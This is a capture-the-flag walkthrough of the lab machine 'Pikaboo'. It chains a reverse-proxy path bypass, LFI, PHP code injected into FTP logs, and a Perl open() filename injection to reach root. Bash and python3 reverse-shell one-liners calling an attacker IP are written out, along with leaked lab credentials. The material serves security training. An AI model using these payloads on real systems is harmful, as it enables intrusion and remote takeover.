# Pikaboo

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.95.191
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-01 23:10 EDT
Warning: 10.129.95.191 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.95.191
Host is up (0.022s latency).
Not shown: 65018 closed tcp ports (conn-refused), 514 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Anonymous logins does not work for this site. We can take a look at the HTTP site.

### Apache Reverse Proxy

It's a Pokemon based website:

<figure><img src="../../../.gitbook/assets/image (1968).png" alt=""><figcaption></figcaption></figure>

The admin portal requires credentials to access:

<figure><img src="../../../.gitbook/assets/image (1055).png" alt=""><figcaption></figcaption></figure>

We can take a look at the Pokatdex and see that there are entries for each specific creature. Props to the creator for designing these:

<figure><img src="../../../.gitbook/assets/image (2462).png" alt=""><figcaption></figcaption></figure>

When we try to view the entries, we just see this:

<figure><img src="../../../.gitbook/assets/image (3991).png" alt=""><figcaption></figcaption></figure>

The URL visited `http://10.129.95.191/pokeapi.php?id=6`, which might be relevant later on. I tested LFI and other types of injection, but nothing worked. I took a closer look at the administrator login, and found that if I keyed in wrong credentails, I got a unique error.

<figure><img src="../../../.gitbook/assets/image (2718).png" alt=""><figcaption></figcaption></figure>

For some reason, it was redirecting me to port 81 on the localhost. This means that some type of proxy is being used to forward the traffic to the right destination. It's called a reverse proxy, and looking for exploits for it led me to this:

{% embed url="https://www.acunetix.com/blog/articles/a-fresh-look-on-reverse-proxy-related-attacks/" %}

Based on the PoC, this is a misconfiguration regarding the proxy used for the `/admin` directory. We can test it out and find that we have bypassed authentication using this method and get a 403 instead.

<figure><img src="../../../.gitbook/assets/image (3214).png" alt=""><figcaption></figcaption></figure>

I tried a `gobuster` scan on this new URL to see if we can find new files to access, and it seems `server-status` has been left publicly available.

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://10.129.95.191/admin../ -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.95.191/admin../
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/05/01 23:28:23 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 401) [Size: 456]
/javascript           (Status: 301) [Size: 314] [--> http://127.0.0.1:81/javascript/]
/server-status        (Status: 200) [Size: 11318]
```

`server-status` contains logs for the Apache server for administrators to view and see, and now we can see it too!

```
Srv	PID	Acc	M	CPU 	SS	Req	Conn	Child	Slot	Client	VHost	Request
0-0	11485	0/6079/29503	W 	0.71	0	0	0.0	3.33	16.96 	127.0.0.1	localhost:81	GET /admin_staging HTTP/1.1
1-0	11496	0/3246/29312	_ 	0.41	2	0	0.0	1.78	16.59 	127.0.0.1	localhost:81	GET /admin/../nscom HTTP/1.0
2-0	4598	0/21543/29637	_ 	2.67	2	0	0.0	12.28	16.76 	127.0.0.1	localhost:81	GET /admin/../32994 HTTP/1.0
3-0	11499	0/1293/23731	_ 	0.22	2	0	0.0	0.71	13.03 	127.0.0.1	localhost:81	GET /admin/../21630 HTTP/1.0
4-0	4607	0/19820/29429	_ 	2.32	2	0	0.0	11.34	16.87 	127.0.0.1	localhost:81	GET /admin/../41221 HTTP/1.0
```

There are loads of requests, and it seems that there's an extra directory at `admin_staging`. We can visit it using `http://10.129.95.191/admin../admin_staging/`.&#x20;

### Admin Staging

This was a dashboard of some sort.

<figure><img src="../../../.gitbook/assets/image (721).png" alt=""><figcaption></figcaption></figure>

The URL is `http://10.129.95.191/admin../admin_staging/index.php?page=dashboard.php`. This could be vulnerable to LFI. I used `wfuzz` to see what files existed on the page using the LFI wordlist. Ideally, we are looking for some type of configuration files.&#x20;

```
$ wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hl=367 http://10.129.95.191/admin../admin_staging/index.php?page=FUZZ  
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.95.191/admin../admin_staging/index.php?page=FUZZ
Total requests: 920

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000733:   200        413 L    1670 W     19803 Ch    "/var/log/vsftpd.log"       
000000734:   200        557 L    1379 W     174271 Ch   "/var/log/wtmp"
```

It seems that we have found 2 files, and both of which have different lengths, indicating that something actually appeared on the page. When we view the FTP log file using `curl`, we find a username for FTP

{% code overflow="wrap" %}
```
Thu Jul  8 17:30:53 2021 [pid 21011] FTP command: Client "::ffff:10.10.14.6", "USER pwnmeow"
Thu Jul  8 17:30:53 2021 [pid 21011] [pwnmeow] FTP response: Client "::ffff:10.10.14.6", "331 Please specify the password."
Thu Jul  8 17:31:01 2021 [pid 21011] [pwnmeow] FTP command: Client "::ffff:10.10.14.6", "PASS <password>"
```
{% endcode %}

The weird part was that there was no password in sight, so we couldn't do much here.

### FTP PHP Injection

Notice that we are able to write to the logs via the username logins, and the page is in PHP. There's a chance that we have to do PHP injection via the username parameter in FTP. This might work because the FTP logs are displayed on the page, whereas the rest of the files aren't.&#x20;

I logged in with a unique username

```
$ ftp 10.129.95.191                                                                
Connected to 10.129.95.191.
220 (vsFTPd 3.0.3)
Name (10.129.95.191:kali): <?php exec("/bin/bash -c 'ping -c 1 10.10.14.13'") ?>
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp>
```

Afterwards, I used the LFI to view the logs again, and I got a callback on `tcpdump`.&#x20;

```
$ sudo tcpdump -i tun0 icmp           
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
23:42:51.905282 IP 10.129.95.191 > 10.10.14.13: ICMP echo request, id 18968, seq 1, length 64
23:42:51.905304 IP 10.10.14.13 > 10.129.95.191: ICMP echo reply, id 18968, seq 1, length 64
23:42:51.915887 IP 10.129.95.191 > 10.10.14.13: ICMP echo request, id 18970, seq 1, length 64
23:42:51.915910 IP 10.10.14.13 > 10.129.95.191: ICMP echo reply, id 18970, seq 1, length 64
23:42:51.926200 IP 10.129.95.191 > 10.10.14.13: ICMP echo request, id 18972, seq 1, length 64
23:42:51.926218 IP 10.10.14.13 > 10.129.95.191: ICMP echo reply, id 18972, seq 1, length 64
23:42:51.936922 IP 10.129.95.191 > 10.10.14.13: ICMP echo request, id 18974, seq 1, length 64
23:42:51.936935 IP 10.10.14.13 > 10.129.95.191: ICMP echo reply, id 18974, seq 1, length 64
23:42:51.948046 IP 10.129.95.191 > 10.10.14.13: ICMP echo request, id 18976, seq 1, length 64
23:42:51.948058 IP 10.10.14.13 > 10.129.95.191: ICMP echo reply, id 18976, seq 1, length 64
```

Great, we now have RCE. We just need to include a `bash` reverse shell one-liner. We can use this:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.13/4444 0>&1'") ?>
```

After viewing the page again, we would get a shell as `www-data`.

<figure><img src="../../../.gitbook/assets/image (1413).png" alt=""><figcaption></figcaption></figure>

We can grab the user flag.

## Privilege Escalation

### Cron -> FTP Creds -> Perl RCE

I downloaded LinPEAS to the machine and it did the enumeration for me. Within the `cronjob` section, it found 1:

```
* * * * * root /usr/local/bin/csvupdate_cron
```

This was running a bash script as `root`, and we can view it:

```bash
#!/bin/bash

for d in /srv/ftp/*
do
  cd $d
  /usr/local/bin/csvupdate $(basename $d) *csv
  /usr/bin/rm -rf *
done
```

This uses another script `csvupdate`. It's a Perl script, and it's rather long, but here's the end of it:

```perl
if($#ARGV < 1)
{
  die "Usage: $0 <type> <file(s)>\n";
}

my $type = $ARGV[0];
if(!exists $csv_fields{$type})
{
  die "Unrecognised CSV data type: $type.\n";
}

my $csv = Text::CSV->new({ sep_char => ',' });

my $fname = "${csv_dir}/${type}.csv";
open(my $fh, ">>", $fname) or die "Unable to open CSV target file.\n";

shift;
for(<>)
{
  chomp;
  if($csv->parse($_))
  {
    my @fields = $csv->fields();
    if(@fields != $csv_fields{$type})
    {
      warn "Incorrect number of fields: '$_'\n";
      next;
    }
    print $fh "$_\n";
  }
}

close($fh);
```

It seems to use `parse` on the CSV. I'm not super great at Perl, so I googled every function used here for vulnerabilities. It appears that `open` can be used for RCE for some weird reason.

{% embed url="https://stackoverflow.com/questions/26614348/perl-open-injection-prevention" %}

Right, so now we have a potential RCE vector, but we still need to find out how to place files into the FTP server. This means we need top find credentials somewhere. Checking the `/opt` directory, I found some files:

```
www-data@pikaboo:/opt/pokeapi$ ls
CODE_OF_CONDUCT.md  README.md         data                pokemon_v2
CONTRIBUTING.md     Resources         docker-compose.yml  requirements.txt
CONTRIBUTORS.txt    __init__.py       graphql             test-requirements.txt
LICENSE.md          apollo.config.js  gunicorn.py.ini
Makefile            config            manage.py
```

Within the `/config/settings.py`, we can find some stuff pertaining to LDAP on this machine.

```python
DATABASES = {
    "ldap": {
        "ENGINE": "ldapdb.backends.ldap",
        "NAME": "ldap:///",
        "USER": "cn=binduser,ou=users,dc=pikaboo,dc=htb",
        "PASSWORD": "J~42%W?PFHl]g",
    },
    "default": {
        "ENGINE": "django.db.backends.sqlite3",
        "NAME": "/opt/pokeapi/db.sqlite3",
    }
}
```

It seems we have a password and a username. We can also confirm that LDAP is running.

```
www-data@pikaboo:/opt/pokeapi/config$ netstat -tulpn | grep 389
tcp        0      0 127.0.0.1:389           0.0.0.0:*               LISTEN      - 
```

The next step would be to enumerate LDAP via `ldapsearch`, which happened to be on the machine.&#x20;

{% code overflow="wrap" %}
```
ldapsearch -h 127.0.0.1 -D 'cn=binduser,ou=users,dc=pikaboo,dc=htb' -w 'J~42%W?PFHl]g' -b 'dc=pikaboo,dc=htb'

# extended LDIF
#
# LDAPv3
# base <> (default) with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 32 No such object

# numResponses: 1
<o,dc=htb' -w 'J~42%W?PFHl]g' -b 'dc=pikaboo,dc=htb''
> ^C
<,dc=htb' -w 'J~42%W?PFHl]g' -b 'dc=pikaboo,dc=htb' 
# extended LDIF
#
# LDAPv3
# base <dc=pikaboo,dc=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# pikaboo.htb
dn: dc=pikaboo,dc=htb
objectClass: domain
dc: pikaboo

# ftp.pikaboo.htb
dn: dc=ftp,dc=pikaboo,dc=htb
objectClass: domain
dc: ftp

# users, pikaboo.htb
dn: ou=users,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# pokeapi.pikaboo.htb
dn: dc=pokeapi,dc=pikaboo,dc=htb
objectClass: domain
dc: pokeapi

# users, ftp.pikaboo.htb
dn: ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# groups, ftp.pikaboo.htb
dn: ou=groups,dc=ftp,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: groups

# pwnmeow, users, ftp.pikaboo.htb
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==

# binduser, users, pikaboo.htb
dn: cn=binduser,ou=users,dc=pikaboo,dc=htb
cn: binduser
objectClass: simpleSecurityObject
objectClass: organizationalRole
userPassword:: Sn40MiVXP1BGSGxdZw==

# users, pokeapi.pikaboo.htb
dn: ou=users,dc=pokeapi,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# groups, pokeapi.pikaboo.htb
dn: ou=groups,dc=pokeapi,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: groups

# search result
search: 2
result: 0 Success

# numResponses: 11
# numEntries: 10
```
{% endcode %}

We can find the user password in Base64 here, and when decoded it gives the password `_G0tT4_C4tcH'3m_4lL!_`

We can't SSH in as the user with this, but we can access the FTP directory and place files.&#x20;

```
$ ftp 10.129.95.191                        
Connected to 10.129.95.191.
220 (vsFTPd 3.0.3)
Name (10.129.95.191:kali): pwnmeow
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Now, we need to place a maliciously named CSV file to get RCE via Perl. There were a load of files within the FTP server, so I just used the one that was updated most recently.

```
drwx-wx---    2 ftp      ftp          4096 May 20  2021 version_groups
drwx-wx---    2 ftp      ftp          4096 May 20  2021 version_names
drwx-wx---    2 ftp      ftp          4096 Jul 06  2021 versions
```

Based on the StackOverflow question, we have to name our file `| <insert bash command>.csv`. In my testing, it seems to reject `/` characters for some reason. So let's create a payload without all of that using a `python3` reverse shell.

{% code overflow="wrap" %}
```
ftp> put test "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("\"10.10.14.13\",4444));[os.dup2(s.fileno(),f)for\ f\ in(0,1,2)];pty.spawn(""\"bash\")';.csv"
```
{% endcode %}

Remember to have a backslash behind all spaces and spaces to allow the upload to work. After waiting for a little while, we would get a reverse shell on the specified port.&#x20;

<figure><img src="../../../.gitbook/assets/image (2355).png" alt=""><figcaption></figcaption></figure>

Rooted!
